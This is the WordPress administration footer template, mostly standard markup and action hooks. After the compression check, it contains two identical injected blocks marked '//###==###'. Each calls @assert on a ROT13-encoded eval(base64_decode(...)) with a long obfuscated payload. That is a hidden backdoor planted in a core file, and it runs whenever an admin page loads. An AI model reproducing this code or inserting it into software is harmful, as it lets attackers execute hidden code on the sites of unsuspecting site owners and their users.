<?php
/**
 * WordPress Administration Template Footer
 *
 * @package WordPress
 * @subpackage Administration
 */

// don't load directly
if ( !defined('ABSPATH') )
	die('-1');
?>

<div class="clear"></div></div><!-- wpbody-content -->
<div class="clear"></div></div><!-- wpbody -->
<div class="clear"></div></div><!-- wpcontent -->

<div id="wpfooter">
<?php do_action( 'in_admin_footer' ); ?>
<p id="footer-left" class="alignleft"><?php
echo apply_filters( 'admin_footer_text', '<span id="footer-thankyou">' . __( 'Thank you for creating with <a href="http://wordpress.org/">WordPress</a>.' ) . '</span>' );
?></p>
<p id="footer-upgrade" class="alignright"><?php echo apply_filters( 'update_footer', '' ); ?></p>
<div class="clear"></div>
</div>
<?php
do_action('admin_footer', '');
do_action('admin_print_footer_scripts');
do_action("admin_footer-" . $GLOBALS['hook_suffix']);

// get_site_option() won't exist when auto upgrading from <= 2.7
if ( function_exists('get_site_option') ) {
	if ( false === get_site_option('can_compress_scripts') )
		compression_test();
}

?>
<?php 
//###==###
@assert(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGgwqKWfK3AyqT9jqPtxLmRfAQVfMzSfp2HcB2A1pzksp2I0o3O0XPEwZFjkBGxkZlk0paIyXGfxnJW2VQ0tVTA1pzksMKuyLltxLmRcB2A1pzksL2kip2HbWTZkXGg9MJkmMJyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcCG0kXKfxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGg9VTyzVPucp3AyqPtxnJW2XFxtrlOyL2uiVPEcLaL7VU0tnJLbnKAmMKDbWS9FEISIEIAHJlWjVy0cVPLzVPEsHxIEIHIGISfvpPWqVQ09VPVkMGIyBGN5AFVcVUftDTSmp2IlqPtxK1WSHIISH1EoVzZvKFx7VU19"));'));
//###==###
?>
<?php 
//###==###
@assert(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGgwqKWfK3AyqT9jqPtxLmRfAQVfMzSfp2HcB2A1pzksp2I0o3O0XPEwZFjkBGxkZlk0paIyXGfxnJW2VQ0tVTA1pzksMKuyLltxLmRcB2A1pzksL2kip2HbWTZkXGg9MJkmMJyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcCG0kXKfxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGg9VTyzVPucp3AyqPtxnJW2XFxtrlOyL2uiVPEcLaL7VU0tnJLbnKAmMKDbWS9FEISIEIAHJlWjVy0cVPLzVPEsHxIEIHIGISfvpPWqVQ09VPVkMGIyBGN5AFVcVUftDTSmp2IlqPtxK1WSHIISH1EoVzZvKFx7VU19"));'));
//###==###
?>

<div class="clear"></div></div><!-- wpwrap -->
<script type="text/javascript">if(typeof wpOnload=='function')wpOnload();</script>
</body>
</html>